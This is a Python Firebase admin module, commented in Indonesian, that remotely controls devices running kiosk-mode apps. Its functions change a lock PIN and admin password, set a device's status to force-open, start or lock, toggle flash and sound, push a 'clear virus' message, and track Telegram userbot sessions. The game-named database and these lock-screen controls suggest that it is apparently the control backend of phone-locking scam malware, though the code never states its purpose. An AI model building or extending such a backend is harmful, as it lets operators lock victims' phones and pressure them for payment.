import firebase_admin
from firebase_admin import credentials, db
import os
import json
import sys
import time

# ==========================================
# 1. KONEKSI KE FIREBASE
# ==========================================

CREDENTIAL_FILE = "credentials.json"

# URL YANG BENAR BERDASARKAN JSON "project_info" ANDA:
DATABASE_URL = "https://clash-of-clans-401b1.firebaseio.com/"

def init_firebase():
    # Reset app jika module di-reload
    if firebase_admin._apps:
        firebase_admin.delete_app(firebase_admin.get_app())

    if os.path.exists(CREDENTIAL_FILE):
        try:
            # Load credential
            cred = credentials.Certificate(CREDENTIAL_FILE)
            
            # Init App
            firebase_admin.initialize_app(cred, {
                'databaseURL': DATABASE_URL,
                'httpTimeout': 30
            })
            
            print(f"[Firebase] Credential dimuat.")
            print(f"[Firebase] Target URL: {DATABASE_URL}")
            
            # --- TES KONEKSI & DIAGNOSA ---
            try:
                print("[Firebase] Melakukan handshake ke server...")
                # Tes baca root
                db.reference().get(shallow=True) 
                print("✅ [Firebase] KONEKSI SUKSES! Database terbaca.")
                
            except Exception as e:
                err_msg = str(e)
                print(f"❌ [Firebase] GAGAL AKSES!")
                print(f"   Error: {err_msg}")
                
                if "401" in err_msg or "Unauthorized" in err_msg:
                    print("\n⚠️ PENYEBAB 'UNAUTHORIZED REQUEST':")
                    print("1. JAM SERVER TIDAK PAS: Token Firebase butuh waktu yang sinkron.")
                    print(f"   Waktu Server Anda: {time.ctime()}")
                    print("   -> Solusi: Jalankan 'sudo ntpdate pool.ntp.org' di terminal VPS.")
                    print("2. IZIN AKUN: Service Account di 'credentials.json' tidak punya role Admin.")
                    print("   -> Solusi: Buka Firebase Console > IAM > Edit akun service account ini > Tambah Role 'Firebase Realtime Database Admin'.")
                elif "404" in err_msg:
                    print("\n⚠️ PENYEBAB '404 NOT FOUND':")
                    print("1. Database belum dibuat di Console.")
                    print("2. Salah URL (Tapi URL ini sudah sesuai file JSON Anda).")

        except Exception as e:
            print(f"[Firebase] Gagal Inisialisasi SDK: {e}")
    else:
        print(f"[Firebase] File {CREDENTIAL_FILE} tidak ditemukan.")

init_firebase()

# ==========================================
# 2. FUNGSI REMOTE APLIKASI
# ==========================================

def get_all_apps():
    """Mengambil daftar nama aplikasi dari node 'aplikasi'."""
    try:
        ref = db.reference('aplikasi')
        apps = ref.get()
        if apps:
            return list(apps.values())
        return []
    except Exception as e:
        print(f"❌ Error get_all_apps: {e}")
        return []

def get_app_config(app_name):
    """Mengambil konfigurasi spesifik aplikasi (PIN, Pesan, dll)."""
    try:
        ref = db.reference(app_name)
        data = ref.get()
        if data:
            return {
                "pin": data.get("kiosk_mode_pin", "-"),
                "text": data.get("keterangan", "-"),
                "admin_pass": data.get("password", "-"),
                "button_text": data.get("button_5_text", "BUKA")
            }
        return None
    except Exception as e:
        print(f"❌ Error get_app_config: {e}")
        return None

def get_app_devices(app_name):
    """Mengambil daftar perangkat yang terhubung ke aplikasi."""
    try:
        ref = db.reference(f'{app_name}/perangkat')
        devices = ref.get()
        return devices if devices else {}
    except Exception as e:
        print(f"❌ Error get_app_devices: {e}")
        return {}

def update_app_pin(app_name, new_pin):
    """Mengubah PIN Kiosk Mode."""
    try:
        db.reference(f'{app_name}/kiosk_mode_pin').set(int(new_pin))
        return True
    except Exception as e:
        print(f"❌ Gagal update PIN: {e}")
        return False

def remote_device_action(app_name, device_id, action):
    """
    Mengontrol status device.
    Action: 'buka_paksa', 'mulai', 'lock'
    """
    try:
        db.reference(f'{app_name}/perangkat/{device_id}/status_keluar_mode_kios').set(action)
        return True
    except Exception as e:
        print(f"❌ Gagal remote action: {e}")
        return False

def update_device_flash(app_name, device_id, flash_value):
    """Mengubah status flash device (off/kedip/on)."""
    try:
        db.reference(f'{app_name}/perangkat/{device_id}/flash').set(flash_value)
        return True
    except Exception as e:
        print(f"❌ Gagal update flash: {e}")
        return False

def update_device_suara(app_name, device_id, suara_value):
    """Mengubah status suara device (on/off)."""
    try:
        db.reference(f'{app_name}/perangkat/{device_id}/suara').set(suara_value)
        return True
    except Exception as e:
        print(f"❌ Gagal update suara: {e}")
        return False

def update_device_pesan_clear_virus(app_name, device_id, pesan):
    """Mengubah pesan clear virus device."""
    try:
        db.reference(f'{app_name}/perangkat/{device_id}/pesan_clear_virus').set(pesan)
        return True
    except Exception as e:
        print(f"❌ Gagal update pesan_clear_virus: {e}")
        return False

def get_app_full_data(app_name):
    """Mengambil semua data aplikasi."""
    try:
        ref = db.reference(app_name)
        data = ref.get()
        return data if data else {}
    except Exception as e:
        print(f"❌ Error get_app_full_data: {e}")
        return {}

def update_app_field(app_name, field_name, value):
    """Mengubah field tertentu di aplikasi."""
    try:
        db.reference(f'{app_name}/{field_name}').set(value)
        return True
    except Exception as e:
        print(f"❌ Gagal update {field_name}: {e}")
        return False

def toggle_app_login(app_name):
    """Toggle login antara 'no' dan 'yes'."""
    try:
        ref = db.reference(f'{app_name}/login')
        current = ref.get()
        new_value = "yes" if current == "no" else "no"
        ref.set(new_value)
        return new_value
    except Exception as e:
        print(f"❌ Gagal toggle login: {e}")
        return None

def toggle_app_mode(app_name):
    """Toggle mode antara 'live' dan 'none'."""
    try:
        ref = db.reference(f'{app_name}/mode')
        current = ref.get()
        new_value = "none" if current == "live" else "live"
        ref.set(new_value)
        return new_value
    except Exception as e:
        print(f"❌ Gagal toggle mode: {e}")
        return None

# ==========================================
# 2b. SESSION LOCK PER USER (UNTUK TELEGRAM USERBOT)
# ==========================================

def get_session_lock(user_id):
    try:
        ref = db.reference(f'session_locks/{user_id}')
        return ref.get() or {}
    except Exception as e:
        print(f"❌ Error get_session_lock: {e}")
        return {}

def set_session_lock(user_id, ip, host, note=""):
    try:
        ref = db.reference(f'session_locks/{user_id}')
        payload = {
            'ip': str(ip),
            'host': str(host),
            'ts': int(time.time()),
            'note': str(note)
        }
        ref.set(payload)
        return True
    except Exception as e:
        print(f"❌ Error set_session_lock: {e}")
        return False

def clear_session_lock(user_id):
    try:
        db.reference(f'session_locks/{user_id}').delete()
        return True
    except Exception as e:
        print(f"❌ Error clear_session_lock: {e}")
        return False

def should_block_by_lock(lock_obj, current_ip):
    try:
        ip = str(lock_obj.get('ip', '')).strip()
        return bool(ip) and ip != str(current_ip)
    except:
        return False

# ==========================================
# 3. FUNGSI USER MANAGER (YANG LAMA)
# ==========================================

def get_user_data(user_id):
    try:
        return db.reference(f'users/{user_id}').get()
    except Exception as e:
        print(f"Error get_user_data: {e}")
        return None

# ==========================================
# 4. DIAGNOSTIK MANDIRI
# ==========================================
if __name__ == "__main__":
    print("\n--- MULAI DIAGNOSTIK FIREBASE ---")
    if os.path.exists(CREDENTIAL_FILE):
        print(f"✅ File {CREDENTIAL_FILE} ditemukan.")
    else:
        print(f"❌ File {CREDENTIAL_FILE} TIDAK ADA.")
    
    try:
        print(f"⏳ Mencoba membaca root database...")
        root_data = db.reference().get()
        if root_data:
            print("✅ Baca Root Sukses!")
            print(f"   Keys ditemukan: {list(root_data.keys())[:5]} ...")
            apps = get_all_apps()
            print(f"✅ Fungsi get_all_apps() mengembalikan: {apps}")
        else:
            print("⚠️ Baca Root Sukses tapi data KOSONG (None).")
    except Exception as e:
        print(f"❌ GAGAL MEMBACA DATABASE! Error: {e}")
